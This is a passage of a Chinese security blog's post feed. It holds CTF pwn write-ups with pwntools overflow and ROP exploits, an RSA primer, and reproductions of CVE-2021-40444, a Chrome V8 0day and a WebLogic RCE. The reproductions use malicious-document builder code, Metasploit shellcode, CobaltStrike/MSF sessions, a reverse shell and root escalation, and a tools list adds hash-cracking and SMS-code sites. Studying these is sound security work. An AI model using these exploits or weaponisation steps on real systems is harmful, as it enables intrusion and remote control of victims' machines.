href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></li><li><a href="https://www.jianshu.com/p/755e52d48a77">https://www.jianshu.com/p/755e52d48a77</a></li><li>GQQQy： <a href="https://www.wangan.com/docs/684">https://www.wangan.com/docs/684</a></li></ul><hr><p>#hello_pwn<br><strong>0x01: <code>checksec</code>查看文件属性</strong></p><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>可以看到是64位程序，只开了NX(堆栈不可执行)，运行一下看看：</p><p><img src="/images/GFSJ-PWN/1/run1.png" alt="get-bof"></p><p>放入IDA分析：</p><p><img src="/images/GFSJ-PWN/1/funtion.png" alt="main"></p><p><strong>流程清晰，现在要做的就是让dword_60106C == 1853186401，继续查看dword_60106C</strong></p><p><img src="/images/GFSJ-PWN/1/funtion.png" alt="6016C"></p><p>可以发现dword_60106C 在 可控输入变量unk_601068在同一个.bss段，且距离四个位置。<br>程序中可看出unk_601068输入点的长度限制为0x10也就是十六位，因此我们可以借此覆盖掉dword_60106C使它变成我们需要的数值。</p><p><img src="/images/GFSJ-PWN/1/exp.png" alt="EXP"></p><p><img src="/images/GFSJ-PWN/1/flag.png" alt="FLAG"></p><p>#level0</p><p><code>checksec</code>后是64位没开启保护，上IDA</p><p><img src="/images/GFSJ-PWN/2/checksec.png" alt="check"></p><p><img src="/images/GFSJ-PWN/2/IDA.png" alt="IDA"></p><p><strong>解题思路：</strong><br>栈溢出，使返回地址指向callsystem函数执行命令。</p><p>buf这个字符数组的长度只有0x80，read()访问的空间长度却是0x200。</p><pre><code>ssize_t vulnerable_function()&#123;  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  return read(0, buf, 0x200uLL);&#125;</code></pre><p>跟踪vulnerable_function()，找到其调用的read()的返回地址入口位置。</p><pre><code>-0000000000000080 ; D/A/*   : change type (data/ascii/array)-0000000000000080 ; N       : rename-0000000000000080 ; U       : undefine-0000000000000080 ; Use data definition commands to create local variables and function arguments.-0000000000000080 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.-0000000000000080 ; Frame size: 80; Saved regs: 8; Purge: 0-0000000000000080 ;-0000000000000080-0000000000000080 buf             db 128 dup(?)+0000000000000000  s              db 8 dup(?)+0000000000000008  r              db 8 dup(?)+0000000000000010+0000000000000010 ; end of stack variables</code></pre><p>确定payload长度,得出exp：</p><pre><code>from pwn import *r = remote(&#39;111.200.241.244&#39;,61757)addr_callsystem = p64(0x00400596)buffover =&#39;A&#39;* 0x80 + &#39;b&#39;* 8 + addr_callsystempayload = buffover + addr_callsystemr.recvuntil(&quot;Hello, World\n&quot;)r.sendline(payload)r.interactive()</code></pre><p><img src="/images/GFSJ-PWN/2/flag.png" alt="FLAG2"></p><p>#level2<br>题目提示类型为ROP，<code>checksec</code>查看程序的保护状态发现开启了NX，继续IDA</p><p><img src="/images/GFSJ-PWN/level2/string.png" alt="bin-sh"></p><p><img src="/images/GFSJ-PWN/level2/system.png" alt="system"></p><p>在字符串窗口可以发现有<br>**/bin/sh<strong>，记录地址：<br>**0804A024</strong>并且左边的函数窗口可以看到在<br>**.plt<strong>段有<br>**_system</strong>函数,记录地址：<br><strong>08048320</strong></p><p>此时结合题目提示，我们需要向题目中输入若干内容，观察到buf的长度为0x88，那么我们便可以构造出0x88长度的无关数据，然后再输入4个长度的垃圾数据以覆盖ebp，然后就是/bin/sh的地址以及call system的地址(这里使用的是text段的地址，这样可以直接使用）构造ROP链，注意添加p32(0)以平衡栈帧<br>EXP：</p><pre><code>from pwn import *r=remote(&#39;111.200.241.244&#39;,61148)bin_sh = 0x0804A024system_adr = 0x08048320payload = &quot;A&quot; * 0x88 + &quot;b&quot; * 4 + p32(system_adr) +p32(0) +p32(bin_sh)r.recvuntil=(&quot;Input:\n&quot;)r.send(payload)r.interactive()</code></pre><p>#string<br>保护机制情况:x64 程序开了NX(堆栈不可执行)、CANARY(栈保护)和PELRO</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA之加密解密原理</title>
      <link href="2021/09/17/rsa-zhi-jia-mi-jie-mi-yuan-li/"/>
      <url>2021/09/17/rsa-zhi-jia-mi-jie-mi-yuan-li/</url>
      
        <content type="html"><![CDATA[<p>1977年，三位数学家Rivest、Shamir 和 Adleman 设计了一种算法，可以实现<strong>非对称加密</strong>。</p><p>这种算法用他们三个人的名字命名，叫做RSA算法。从那时直到现在，RSA算法一直是最广为使用的 **”非对称加密算法”**。毫不夸张地说，只要有计算机网络的地方，就有RSA算法。</p><p>这种算法非常可靠，密钥越长，它就越难破解。根据已经披露的文献，目前被破解的最长RSA密钥是768个二进制位。也就是说，长度超过768位的密钥，还无法破解（至少没人公开宣布）。因此可以认为，1024位的RSA密钥基本安全，2048位的密钥极其安全。</p><h1 id="RSA算法涉及的数学知识"><a href="#RSA算法涉及的数学知识" class="headerlink" title="RSA算法涉及的数学知识"></a>RSA算法涉及的数学知识</h1><p>一、互质关系<br>二、欧拉函数<br>三、欧拉定理<br>四、模反元素</p><h1 id="密钥生成的步骤"><a href="#密钥生成的步骤" class="headerlink" title="密钥生成的步骤"></a>密钥生成的步骤</h1><p>假设A与B通信需要进行加密</p><p>1：A随机选择两个不相等的质数，p和q。 </p><p><code>【61，53】</code></p><p>2：计算 p*q = n  </p><p><code>【n = 61×53 = 3233】</code></p><p>此时n的二进制位数就是密钥的位数。实际应用中，RSA密钥一般是1024位，重要场合则为2048位。</p><p>3: 计算n的欧拉函数φ(n) </p><p><code>【φ(3233)等于60×52，即3120。】</code></p><p>根据公式：</p><pre><code>　　φ(n) = (p-1)(q-1)</code></pre><p>4：随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质<br><code>【e=17】</code></p><p>A在1到3120之间，随机选择了17。（实际应用中，常常选择65537。）</p><p>5：计算e对于φ(n)的模反元素d</p><p>根据公式：</p><pre><code>ed ≡ 1 (mod φ(n)) ed - 1 = kφ(n)ex + φ(n)y = 117x + 3120y = 1</code></pre><p>这个方程可以用”扩展欧几里得算法”求解，此处省略具体过程。</p><p>此处得出一组整数解为 (x,y)=(2753,-15)，即 <code>【d=2753】</code></p><h2 id="至此所有计算完成，梳理参数"><a href="#至此所有计算完成，梳理参数" class="headerlink" title="至此所有计算完成，梳理参数"></a>至此所有计算完成，梳理参数</h2><p>①：p=61, q=53 ②n=3233 ③ φ(n)=3120 ④ e=17 ⑤d=2753</p><p>6：将n和e封装成公钥，n和d封装成私钥</p><p>n=3233，e=17，d=2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）<br>    Tips:实际应用中，公钥和私钥的数据都采用ASN.1格式表达.</p><p>7：RSA算法的可靠性</p><p>上面计算产生的六个数字之中，公钥用到了两个（n和e），其余四个数字都是不公开的。</p><p>其中最关键的是d，因为n和d组成了私钥，一旦d泄漏，就等于私钥泄漏。那么，有无可能在已知n和e的情况下，推导出d？</p><pre><code>（1）ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。（2）φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。（3）n=pq。只有将n因数分解，才能算出p和q。</code></pre><p>结论：如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。<br>可是，大整数的因数分解，是一件非常困难的事情。目前，除了暴力破解，还没有发现别的有效方法。维基百科这样写道：</p><pre><code>　&quot;对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。　　假如有人找到一种快速因数分解的算法，那么RSA的可靠性就会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA密钥才可能被暴力破解。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。　　只要密钥长度足够长，用RSA加密的信息实际上是不能被解破的。&quot;</code></pre><p>举例来说，你可以对3233进行因数分解（61×53），但是你没法对下面这个整数进行因数分解。</p><pre><code>12301866845301177551304949　　58384962720772853569595334　　79219732245215172640050726　　36575187452021997864693899　　56474942774063845925192557　　32630345373154826850791702　　61221429134616704292143116　　02221240479274737794080665　　351419597459856902143413</code></pre><p>它等于这样两个质数的乘积：</p><pre><code>　　33478071698956898786044169　　84821269081770479498371376　　85689124313889828837938780　　02287614711652531743087737　　814467999489　　　　×　　36746043666799590428244633　　79962795263227915816434308　　76426760322838157396665112　　79233373417143396810270092　　798736308917</code></pre><p>事实上，这大概是人类已经分解的最大整数（232个十进制位，768个二进制位）。比它更大的因数分解，还没有被报道过，因此目前被破解的最长RSA密钥就是768位。</p><h1 id="加密和解密"><a href="#加密和解密" class="headerlink" title="加密和解密"></a>加密和解密</h1><p>有了公钥和密钥，就能进行加密和解密了。</p><p>（1）加密要用公钥 (n,e)</p><p>假设B要向A发送加密信息m，他就要用A的公钥 (n,e) 对m进行加密。</p><p>这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。</p><p>【这里得到密文c】需要的数值是 m、 n 、e</p><p>（2）解密要用私钥(n,d)</p><p>A拿到B的密文后，用自己的私钥解密。<br>通过n、d、c解密得到明文消息m。</p><p>我们可以看到，如果不知道d，就没有办法从c求出m。而前面已经说过，要知道d就必须分解n，这是极难做到的，所以RSA算法保证了通信安全。</p><p>你可能会问，公钥(n,e) 只能加密小于n的整数m，那么如果要加密大于n的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种”对称性加密算法”（比如DES），用这种算法的密钥加密信息，再用RSA公钥加密DES密钥。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MICROSOFT MSHTML远程代码执行漏洞（CVE-2021-40444）</title>
      <link href="2021/09/13/mshtml-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2021-40444/"/>
      <url>2021/09/13/mshtml-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2021-40444/</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2021-40444-漏洞背景"><a href="#CVE-2021-40444-漏洞背景" class="headerlink" title="CVE-2021-40444 漏洞背景"></a>CVE-2021-40444 漏洞背景</h2><p>MSHTML（又称为Trident）是微软旗下的Internet Explorer 浏览器引擎，也用于 Office 应用程序，以在 Word、Excel 或 PowerPoint 文档中呈现 Web 托管的内容。AcitveX控件是微软COM架构下的产物，在Windows的Office套件、IE浏览器中有广泛的应用，利用ActiveX控件即可与MSHTML组件进行交互。<br><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444</a></p><h2 id="poc执行流程"><a href="#poc执行流程" class="headerlink" title="poc执行流程"></a>poc执行流程</h2><p>1:创建恶意的dll文件，注入到word中，并生成对应*.cab、*.html<br>设定word启动加载MSHTML -&gt; serverIP</p><p>Generating malicious docx file</p><pre><code>    os.chdir(&#39;data/tmp_doc/&#39;)    os.system(&#39;zip -r document.docx *&#39;)</code></pre><p>Generating malicious CAB file</p><pre><code>cp word.dll msword.inflcab \&#39;../msword.inf\&#39; out.cab</code></pre><p>Set information on HTML exploit</p><pre><code>    xml_content = xml_content.replace(&#39;&lt;EXPLOIT_HOST_HERE&gt;&#39;, srv_url + &#39;/word.html&#39;)    rels_pw = open(&#39;data/tmp_doc/word/_rels/document.xml.rels&#39;, &#39;w&#39;)    rels_pw.write(xml_content)</code></pre><h2 id="关键位置"><a href="#关键位置" class="headerlink" title="关键位置"></a>关键位置</h2><p>将恶意的dll通过lcab变成cab文件提供远程访问</p><p>在word资源文件中指定RemoteServer地址请求恶意cab</p><p>最终利用office -&gt; GET /word.cab -&gt;  执行恶意代码</p><h2 id="改造利用上线CobaltStrike"><a href="#改造利用上线CobaltStrike" class="headerlink" title="改造利用上线CobaltStrike"></a>改造利用上线CobaltStrike</h2><p><img src="/images/MSHTML2021-40444/cs.gif" alt="结合CobaltStrike上线成功"></p><hr><blockquote><p>Tips:</p><ol><li><a href="https://packages.debian.org/sid/lcab">sudo apt-get install lcab</a></li><li>poc: <a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></li><li>影响版本：<br>Windows Server, version 20H2 (Server Core Installation)<br>Windows Server, version 2004 (Server Core installation)<br>Windows Server 2022 (Server Core installation)<br>Windows Server 2022<br>Windows Server 2019 (Server Core installation)<br>Windows Server 2019<br>Windows Server 2016 (Server Core installation)<br>Windows Server 2016<br>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)<br>Windows Server 2008 for x64-based Systems Service Pack 2<br>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)<br>Windows Server 2008 for 32-bit Systems Service Pack 2<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows RT 8.1<br>Windows 8.1 for x64-based systems<br>Windows 8.1 for 32-bit systems<br>Windows 7 for x64-based Systems Service Pack 1<br>Windows 7 for 32-bit Systems Service Pack 1<br>Windows 10 for x64-based Systems<br>Windows 10 for 32-bit Systems<br>Windows 10 Version 21H1 for x64-based Systems<br>Windows 10 Version 21H1 for ARM64-based Systems<br>Windows 10 Version 21H1 for 32-bit Systems<br>Windows 10 Version 20H2 for x64-based Systems<br>Windows 10 Version 20H2 for ARM64-based Systems<br>Windows 10 Version 20H2 for 32-bit Systems<br>Windows 10 Version 2004 for x64-based Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1809 for x64-based Systems<br>Windows 10 Version 1809 for ARM64-based Systems<br>Windows 10 Version 1809 for 32-bit Systems<br>Windows 10 Version 1607 for x64-based Systems<br>Windows 10 Version 1607 for 32-bit Systems</li></ol></blockquote><hr><h2 id="防御办法"><a href="#防御办法" class="headerlink" title="防御办法"></a>防御办法</h2><h2 id="临时缓解措施"><a href="#临时缓解措施" class="headerlink" title="临时缓解措施"></a>临时缓解措施</h2><p>在 Internet Explorer 中禁用所有区域的 ActiveX 控件安装可缓解此漏洞攻击，可通过创建注册表文件禁用 ActiveX 控件（建议备份后再进行操作）：<br>1.将以下方框中的内容粘贴到文本文件中并使用 .reg 文件扩展名保存：</p><p><img src="/images/MSHTML2021-40444/img.png" alt="img.png"></p><p>2.双击 .reg 文件，将其应用到策略配置单元。</p><p>3.重新启动系统以确保应用新配置。</p><p>注：以上操作会将 64 位和 32 位进程的所有 Internet 区域的URLACTION_DOWNLOAD_SIGNED_ACTIVEX (0x1001) 和 URLACTION_DOWNLOAD_UNSIGNED_ACTIVEX (0x1004) 设置为 DISABLED (3)。并不会安装新的 ActiveX 控件，之前安装的 ActiveX 控件将继续运行。</p><p>撤消此缓解措施：</p><p>删除在实施此操作时添加的注册表项。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1195777-chrome0day结合MSF</title>
      <link href="2021/04/15/1195777-chrome0day-jie-he-msf/"/>
      <url>2021/04/15/1195777-chrome0day-jie-he-msf/</url>
      
        <content type="html"><![CDATA[<h1 id="No1：Chrome-V8引擎远程代码执行0day"><a href="#No1：Chrome-V8引擎远程代码执行0day" class="headerlink" title="No1：Chrome V8引擎远程代码执行0day"></a>No1：Chrome V8引擎远程代码执行0day</h1><h2 id="漏洞背景："><a href="#漏洞背景：" class="headerlink" title="漏洞背景："></a>漏洞背景：</h2><p>该漏洞影响Chrome最新正式版（90.0.4430.72）以及基于Chromium内核的Microsoft Edge正式版（89.0.774.77）以下版本。</p><p>漏洞POC(<a href="https://github.com/avboy1337/1195777-chrome0day">https://github.com/avboy1337/1195777-chrome0day</a>) </p><h2 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h2><p>攻击者可通过构造特制web页面并诱导受害者访问来利用此漏洞获得远程代码执行。<br>Google Chrome是由Google开发的免费网页浏览器。许多第三方浏览器使用Chromium内核，这些浏览器同样会受该0day漏洞影响。</p><h2 id="漏洞概览："><a href="#漏洞概览：" class="headerlink" title="漏洞概览："></a>漏洞概览：</h2><ul><li>漏洞编号<ul><li>暂无</li></ul></li><li>漏洞等级<ul><li>严重</li></ul></li><li>影响版本<ul><li>Google Chrome &lt;= 90.0.4430.72</li><li>基于Chromium内核的Microsoft Edge &lt;= 89.0.774.77</li><li>其他基于V8引擎的第三方浏览器</li></ul></li></ul><p>目前Google暂未修复该漏洞，该漏洞仍为0day状态。 建议在官方未修复漏洞期间，谨慎使用或者切换使用其他浏览器。</p><h1 id="No2-POC复现替换MSFpayload"><a href="#No2-POC复现替换MSFpayload" class="headerlink" title="No2:POC复现替换MSFpayload"></a>No2:POC复现替换MSFpayload</h1><h2 id="0x01-生成自己的payload"><a href="#0x01-生成自己的payload" class="headerlink" title="0x01:生成自己的payload"></a>0x01:生成自己的payload</h2><p>通过查看POC代码，可以看到shellcode可执行部分是可以替换的，达成我们想要的效果，那么我们试试MSF生成自己的shellcode。</p><p>这里我们替换原文的shellcode，达到弹出计算器的目的。</p><pre><code>    let shellcode = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00]; </code></pre><p><img src="/images/1195777/calc.mov" alt="成功弹出计算器"></p><h2 id="0x02-msf生成payload上线"><a href="#0x02-msf生成payload上线" class="headerlink" title="0x02:msf生成payload上线"></a>0x02:msf生成payload上线</h2><p><img src="/images/1195777/msfok.jpg" alt="成功监听上线"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chrome </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic未授权命令执行反弹shell</title>
      <link href="2020/11/09/weblogic-wei-shou-quan-ming-ling-zhi-xing-fan-dan-shell/"/>
      <url>2020/11/09/weblogic-wei-shou-quan-ming-ling-zhi-xing-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01:漏洞详情"></a>0x01:漏洞详情</h1><blockquote><p>No.1: CVE-2020-14883: 权限绕过漏洞 </p><blockquote><p>远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console。</p></blockquote><p>No.2: CVE-2020-14882: 代码执行漏洞</p><blockquote><p>结合 CVE-2020-14883 漏洞，远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server Console 执行任意代码。</p></blockquote></blockquote><hr><hr><h1 id="0x02-复现环境："><a href="#0x02-复现环境：" class="headerlink" title="0x02:复现环境："></a>0x02:复现环境：</h1><hr><blockquote><p>linux :2.6.32</p><p>java version “1.6.0_45”<br>Java(TM) SE Runtime Environment (build 1.6.0_45-b06)<br>Java HotSpot(TM) 64-Bit Server VM (build 20.45-b01, mixed mode)</p><p>weblogic 10.3.6</p></blockquote><hr><h1 id="0x03-Expolit"><a href="#0x03-Expolit" class="headerlink" title="0x03:Expolit"></a>0x03:Expolit</h1><p><strong><em>成功反弹shell并提权</em></strong></p><blockquote><p>1.C2服务器开启web服务，搭建构造好的poc.xml，用于反弹shell或者行命令</p></blockquote><blockquote><p>2.利用漏洞加载Spring的 ClassPathXmlApplicationContext类访问我们的远程poc.xml</p><blockquote><p>ClassPathXmlApplicationContext的使用：<a href="https://blog.csdn.net/u012397322/article/details/87545950">https://blog.csdn.net/u012397322/article/details/87545950</a></p></blockquote></blockquote><blockquote><p>3.本地监听poc.xml的反弹地址，成功获取shell，由于linux内核版本存在脏牛漏洞，顺手提了个root～</p></blockquote><p><img src="/images/cve-2020-14882/pocxml.png" alt="成功利用"></p><p>参考链接：</p><p>漏洞poc详情参考: <a href="https://github.com/jas502n/CVE-2020-14882">https://github.com/jas502n/CVE-2020-14882</a><br>ClassPathXmlApplicationContext类的使用：<br><a href="https://blog.csdn.net/u012397322/article/details/87545950">https://blog.csdn.net/u012397322/article/details/87545950</a><br>从FileSystemXmlApplicationContext窥探spring源码一角:<br><a href="https://blog.csdn.net/p13132312312/article/details/103919444">https://blog.csdn.net/p13132312312/article/details/103919444</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
            <tag> CVE-2020-14882，CVE-2020-14883 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tools-Online</title>
      <link href="2020/10/09/tools-online/"/>
      <url>2020/10/09/tools-online/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="在线自服务与工具"><a href="#在线自服务与工具" class="headerlink" title="在线自服务与工具"></a><strong>在线自服务与工具</strong></h2><blockquote><p><a href="https://github.com/Kickball/awesome-selfhosted">https://github.com/Kickball/awesome-selfhosted</a> awesome系列之自服务应用<br><br><a href="https://github.com/littlecodersh/itchat">https://github.com/littlecodersh/itchat</a> 微信个人号接口、微信机器人及命令行微信<br><br><a href="https://github.com/sym233/core-values-encoder">https://github.com/sym233/core-values-encoder</a> js,社会主义核心价值观加密，<br><a href="https://sym233.github.io/core-values-encoder/">https://sym233.github.io/core-values-encoder/</a><br><br><a href="https://github.com/valentinxxx/nginxconfig.io/">https://github.com/valentinxxx/nginxconfig.io/</a> 在线nginx配置文件生成，demo网址<br><a href="https://nginxconfig.io/">https://nginxconfig.io</a><br><br><a href="https://github.com/asciimoo/searx">https://github.com/asciimoo/searx</a> 搭建一个自己的搜索引擎,DEMO网址<br><a href="https://searx.me/">https://searx.me/</a><br><br><a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a> server酱微信通知<br><br><a href="https://osint.link/">https://osint.link</a> Open Source Intelligence (OSINT) Tools &amp; Resources<br><br><a href="https://www.wolframalpha.com/">https://www.wolframalpha.com</a> 根据问题直接给出答案的网站<br>shodan.io 互联网感知引擎<br>fofa.so 白帽汇NOSEC<br><br><a href="https://www.oshadan.com/">https://www.oshadan.com</a> 傻蛋联网设备搜索_湖南安数网络<br>zoomeye.org 知道创宇互联网感知引擎<br><br><a href="https://sms.cngrok.com/receiving-sms">https://sms.cngrok.com/receiving-sms</a> 收码接码<br><br><a href="https://www.pdflibr.com/">https://www.pdflibr.com/</a> 收码接码<br><br><a href="https://www.fakenamegenerator.com/">https://www.fakenamegenerator.com</a> 多国身份信息模拟器<br><br><a href="https://recruitin.net/">https://recruitin.net</a> Easily use Google to search profiles on LinkedIn<br><br><a href="https://www.truthfinder.com/">https://www.truthfinder.com</a> 美国公民信息查询<br><br><a href="https://verify-email.org/">https://verify-email.org</a> 邮件真实性验证<br><br><a href="https://safeweb.norton.com/">https://safeweb.norton.com</a> 诺顿网站安全检测<br><br><a href="http://www.vuln.cn/tools/ftp">http://www.vuln.cn/tools/ftp</a> 在线FTP登录<br><br><a href="http://www.link114.cn/title/">http://www.link114.cn/title/</a> 批量查询网站标题<br><br><a href="https://www.whatweb.net/">https://www.whatweb.net/</a> 在线web指纹识别<br><br><a href="https://hackertarget.com/ip-tools/">https://hackertarget.com/ip-tools/</a> 提供api，ip相关工具、在线扫描器<br><br><a href="http://www.webscan.cc/">http://www.webscan.cc/</a> 同IP网站查询,C段查询,IP反查域名,C段旁注,旁注工具<br><br><a href="https://www.phpinfo.me/bing.php">https://www.phpinfo.me/bing.php</a> 在线旁站查询|C段查询|必应接口C段查询<br><br><a href="https://www.phpinfo.me/domain/">https://www.phpinfo.me/domain/</a> 在线子域名爆破<br><br><a href="https://www.dnsdb.io/">https://www.dnsdb.io</a> DNS查询,子域名查询,IP查询,A记录查询,域名解析,旁站查询<br><br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> dns recon and research, find and lookup dns records<br><br><a href="http://ip.chaxun.la/">http://ip.chaxun.la/</a> ip反查域名—查询啦<br><br><a href="https://habo.qq.com/">https://habo.qq.com</a> 在线恶意文件检测<br><br><a href="https://www.virustotal.com/">https://www.virustotal.com</a> 恶意软件检测<br><br><a href="http://r.virscan.org/">http://r.virscan.org/</a> 恶意软件检测<br><br><a href="https://www.appscan.io/">https://www.appscan.io</a> 移动软件在线检测<br><br><a href="https://www.nomoreransom.org/">https://www.nomoreransom.org</a> 常见勒索软件分析还原<br><br><a href="https://www.cmd5.com/">https://www.cmd5.com/</a> HASH密码在线破解<br><br><a href="https://www.onlinehashcrack.com/">https://www.onlinehashcrack.com</a> 密码哈希在线破解，邮件通知</p></blockquote><h2 id="在线办公套件"><a href="#在线办公套件" class="headerlink" title="在线办公套件"></a><strong>在线办公套件</strong></h2><blockquote><p><a href="https://sadd.io/">https://sadd.io/</a> 在线操作系统<br><br><a href="https://github.com/zyx0814/dzzoffice">https://github.com/zyx0814/dzzoffice</a> 在线办公套件,DEMO网址demo.dzzoffice.com<br><br><a href="https://github.com/RobbieHan/gistandard">https://github.com/RobbieHan/gistandard</a> py，基于Django，OA工单办公管理系统<br><br><a href="https://github.com/pavanw3b/sh00t">https://github.com/pavanw3b/sh00t</a> PY3,DJANGO，安全测试工单管理<br><br><a href="https://github.com/chaitin/strapdown-zeta">https://github.com/chaitin/strapdown-zeta</a> 基于strapdown.js，长亭二次开发开源的Wiki系统，支持markdown<br><br><a href="https://etherpad.net/">https://etherpad.net/</a> 在线可编辑记事本<br><br><a href="https://www.upload.ee/">https://www.upload.ee/</a> 文件共享平台<br><br><a href="https://github.com/micahflee/onionshare">https://github.com/micahflee/onionshare</a> 利用onion洋葱服务器匿名文件共享<br><br><a href="https://github.com/filebrowser/filebrowser">https://github.com/filebrowser/filebrowser</a> GO,基于Caddy框架的网盘<br><br><a href="https://github.com/nextcloud/server">https://github.com/nextcloud/server</a> php，私有云网盘，owncloud分支<br><br><a href="https://github.com/owncloud/core">https://github.com/owncloud/core</a> php，私有云网盘，界面不美观<br><br><a href="https://github.com/haiwen/seafile">https://github.com/haiwen/seafile</a> C,私有云网盘，速度快，功能少<br><br><a href="https://github.com/ymfe/yapi">https://github.com/ymfe/yapi</a> API管理工具<br><br><a href="https://thyrsi.com/">https://thyrsi.com/</a> 图片上传分享工具</p></blockquote><h2 id="隐私匿名加密"><a href="#隐私匿名加密" class="headerlink" title="隐私匿名加密"></a><strong>隐私匿名加密</strong></h2><blockquote><p><a href="https://www.lshack.cn/118/">https://www.lshack.cn/118/</a> 在线接收验证码/邮箱/粘贴板/文件传输大集合。<br><br><a href="http://bccto.me/">http://bccto.me</a> 一次性邮箱<br><br><a href="https://www.guerrillamail.com/">https://www.guerrillamail.com</a> 